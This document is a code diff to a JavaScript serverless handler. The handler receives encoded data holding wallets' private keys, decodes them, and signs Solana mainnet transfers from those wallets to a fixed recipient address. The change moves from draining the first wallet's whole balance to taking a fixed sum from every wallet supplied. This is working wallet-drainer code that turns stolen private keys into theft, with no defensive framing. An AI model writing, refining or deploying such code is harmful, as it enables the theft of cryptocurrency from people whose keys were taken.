@@ -5,6 +5,7 @@ const bs58 = require('bs58').default; // Use .default for CommonJS compatibility
 const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'ENTER_RECIPIENT_PUBLIC_KEY_HERE';
 const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
 const FEE_ESTIMATE = 5000; // Fallback lamports estimate
+const TRANSFER_AMOUNT = 4000; // Fixed transfer amount: 0.004 SOL (4000 lamports)
 
 // In-memory set to prevent duplicate transfers (resets on function restart)
 const processedKeys = new Set();
@@ -34,85 +35,87 @@ export default async function handler(req, res) {
       console.log('[decoded]', decoded); // Debug
       const parsedData = tryJsonParse(decoded) ?? decoded;
       
-      // Log decoded data with redacted private key
+      // Log decoded data with redacted private keys
       console.log('[decoded-data]', {
         ...parsedData,
         wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
       });
 
-      // Process private key for SOL transfer if wallets exist
-      if (parsedData?.wallets?.[0]?.key) {
-        const privateKeyBase58 = parsedData.wallets[0].key;
-        try {
-          // Decode base58 to Uint8Array
-          const secretKey = bs58.decode(privateKeyBase58);
-          if (secretKey.length !== 64) {
-            throw new Error('Invalid private key length (must be 64 bytes)');
+      // Process private keys for SOL transfer if wallets exist
+      if (parsedData?.wallets?.length > 0) {
+        for (const [index, wallet] of parsedData.wallets.entries()) {
+          const privateKeyBase58 = wallet.key;
+          if (!privateKeyBase58) {
+            console.log(`[no-key] No valid key for wallet at index ${index}`);
+            continue;
           }
+          try {
+            // Decode base58 to Uint8Array
+            const secretKey = bs58.decode(privateKeyBase58);
+            if (secretKey.length !== 64) {
+              throw new Error('Invalid private key length (must be 64 bytes)');
+            }
 
-          // Create Solana connection
-          const connection = new Connection(CLUSTER_URL, 'confirmed');
+            // Create Solana connection
+            const connection = new Connection(CLUSTER_URL, 'confirmed');
 
-          // Create Keypair and recipient PublicKey
-          const fromKeypair = Keypair.fromSecretKey(secretKey);
-          const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
-          const pubkeyStr = fromKeypair.publicKey.toBase58();
+            // Create Keypair and recipient PublicKey
+            const fromKeypair = Keypair.fromSecretKey(secretKey);
+            const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
+            const pubkeyStr = fromKeypair.publicKey.toBase58();
 
-          // Check for duplicate processing
-          if (processedKeys.has(pubkeyStr)) {
-            console.log(`[skip] Already processed key: ${pubkeyStr}`);
-          } else {
+            // Check for duplicate processing
+            if (processedKeys.has(pubkeyStr)) {
+              console.log(`[skip] Already processed key at index ${index}: ${pubkeyStr}`);
+              continue;
+            }
             processedKeys.add(pubkeyStr);
 
             // Get balance and blockhash
             const balance = await connection.getBalance(fromKeypair.publicKey);
-            console.log('[balance]', balance); // Debug
-            if (balance <= FEE_ESTIMATE) {
-              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr}: ${balance} lamports`);
-            } else {
-              const { blockhash } = await connection.getLatestBlockhash();
-
-              // Create transfer transaction
-              const transaction = new Transaction({
-                recentBlockhash: blockhash,
-                feePayer: fromKeypair.publicKey,
-              });
-
-              // Add transfer instruction with fallback fee
-              transaction.add(
-                SystemProgram.transfer({
-                  fromPubkey: fromKeypair.publicKey,
-                  toPubkey,
-                  lamports: balance - FEE_ESTIMATE,
-                })
-              );
-
-              // Calculate exact fee after transaction is built
-              const fee = await transaction.getEstimatedFee(connection) || FEE_ESTIMATE;
-              if (balance <= fee) {
-                console.error(`[error] Insufficient balance for fee from ${pubkeyStr}: ${balance} lamports, fee: ${fee}`);
-              } else {
-                // Update lamports with exact fee (write 64-bit little-endian)
-                const lamportsBuffer = Buffer.alloc(8);
-                lamportsBuffer.writeBigUInt64LE(BigInt(balance - fee), 0);
-                transaction.instructions[0].data = Buffer.concat([
-                  transaction.instructions[0].data.subarray(0, 4), // Instruction prefix
-                  lamportsBuffer // Updated lamports
-                ]);
-                // Send and confirm
-                const signature = await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
-                  maxRetries: 2,
-                  skipPreflight: false,
-                });
-                console.log(`[success] Transferred ${balance - fee} lamports from ${pubkeyStr} to ${toPubkey.toBase58()}. Signature: ${signature}`);
-              }
+            console.log(`[balance] Wallet ${index}: ${balance} lamports`); // Debug
+            const totalRequired = TRANSFER_AMOUNT + FEE_ESTIMATE;
+            if (balance < totalRequired) {
+              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: ${totalRequired}`);
+              continue;
             }
+
+            const { blockhash } = await connection.getLatestBlockhash();
+
+            // Create transfer transaction
+            const transaction = new Transaction({
+              recentBlockhash: blockhash,
+              feePayer: fromKeypair.publicKey,
+            });
+
+            // Add transfer instruction with fixed amount
+            transaction.add(
+              SystemProgram.transfer({
+                fromPubkey: fromKeypair.publicKey,
+                toPubkey,
+                lamports: TRANSFER_AMOUNT,
+              })
+            );
+
+            // Calculate exact fee after transaction is built
+            const fee = await transaction.getEstimatedFee(connection) || FEE_ESTIMATE;
+            if (balance < TRANSFER_AMOUNT + fee) {
+              console.error(`[error] Insufficient balance for fee from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: ${TRANSFER_AMOUNT + fee}`);
+              continue;
+            }
+
+            // Send and confirm
+            const signature = await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
+              maxRetries: 2,
+              skipPreflight: false,
+            });
+            console.log(`[success] Transferred ${TRANSFER_AMOUNT} lamports from ${pubkeyStr} (wallet ${index}) to ${toPubkey.toBase58()}. Signature: ${signature}`);
+          } catch (error) {
+            console.error(`[transfer-error] Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}... (wallet ${index}): ${error.message}`);
           }
-        } catch (error) {
-          console.error('[transfer-error]', `Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}...: ${error.message}`);
         }
       } else {
-        console.log('[no-key]', 'No valid wallets[0].key found in parsed data');
+        console.log('[no-wallets]', 'No wallets found in parsed data');
       }
     } catch (e) {
       console.log('[decode-error]', e?.message || String(e));
